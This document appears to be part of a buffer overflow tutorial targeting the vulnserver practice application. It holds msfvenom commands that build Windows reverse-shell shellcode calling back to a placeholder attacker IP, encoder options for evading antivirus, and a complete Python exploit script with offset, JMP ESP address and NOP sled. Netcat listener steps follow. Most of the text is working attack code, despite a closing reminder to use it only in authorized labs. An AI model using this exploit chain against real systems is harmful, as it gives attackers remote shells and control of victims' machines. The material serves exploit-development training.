# Buffer Overflow Guide - Part 4
## Shellcode Generation and Final Exploit

### 1. Generate Shellcode
In Kali Linux, generate reverse shell shellcode:

```bash
msfvenom -p windows/shell_reverse_tcp \
LHOST=YOUR_KALI_IP \
LPORT=4444 \
EXITFUNC=thread \
-f python \
-b "\x00" \
-v shellcode
```

### 2. Final Exploit Script
Create `exploit.py`:

```python
#!/usr/bin/python3
import socket

host = "172.29.98.109"  # Target IP
port = 9999             # Target Port

# MSFVenom generated shellcode (paste here)
shellcode = (
    "\xbe\x15\x31\xa5\x41\xdb\xd2\xd9\x74\x24\xf4\x58\x31"
    "\xc9\xb1\x52\x83\xe8\xfc\x31\x70\x0e\x03\x70\x92\x7a"
    # ... rest of your shellcode ...
)

# Exploit details
offset = 2003                          # Confirmed offset
eip = "\xaf\x11\x50\x62"              # JMP ESP address (replace with yours)
nops = "\x90" * 16                     # NOP sled

# Build the payload
buffer = "A" * offset
payload = buffer + eip + nops + shellcode

# Exploit function
def exploit():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        print("[+] Connected to target!")
        
        print("[+] Sending evil buffer...")
        s.send(bytes("TRUN /.:/" + payload, "latin-1"))
        s.close()
        
        print("[+] Exploit sent successfully!")
        print("[*] Check your netcat listener!")
    except:
        print("[-] Could not connect!")

# Start listener reminder
print("[!] Don't forget to start your netcat listener!")
print("[!] Command: nc -nvlp 4444")
input("[*] Press Enter to continue once listener is ready...")

# Run exploit
exploit()
```

### 3. Set Up Listener
Before running exploit, start listener in Kali:
```bash
nc -nvlp 4444
```

### 4. Execution Steps

1. On Target Windows Machine:
   - Ensure vulnserver is running
   - Start Immunity Debugger as Administrator
   - Attach to vulnserver process
   - Click Play button

2. On Kali Machine:
   ```bash
   # Get your Kali IP
   ip addr show
   
   # Update exploit.py with your IP
   nano exploit.py
   
   # Start listener
   nc -nvlp 4444
   
   # In new terminal, run exploit
   python3 exploit.py
   ```

### Troubleshooting Tips

1. If exploit fails:
   - Check target is running and debugger is attached
   - Verify IP addresses are correct
   - Ensure antivirus is disabled on target
   - Try increasing NOP sled size
   - Verify shellcode has no bad characters

2. Common Issues:
   ```python
   # Try different encoders in msfvenom
   msfvenom -p windows/shell_reverse_tcp \
   LHOST=YOUR_KALI_IP LPORT=4444 \
   -f python -e x86/shikata_ga_nai \
   -i 3 \
   EXITFUNC=thread \
   -b "\x00"
   
   # Try different payload
   -p windows/shell/reverse_tcp  # Staged
   -p windows/meterpreter/reverse_tcp  # Meterpreter
   ```

### Expected Results

1. Successful execution:
   - Exploit runs without errors
   - Target application crashes
   - Netcat listener receives connection
   - Windows command prompt appears in netcat session

2. Verify access:
   ```cmd
   # In reverse shell
   whoami
   ipconfig
   dir
   ```

### Security Reminder
- Only use in authorized test environment
- Document all testing for educational purposes
- Reset system state after testing
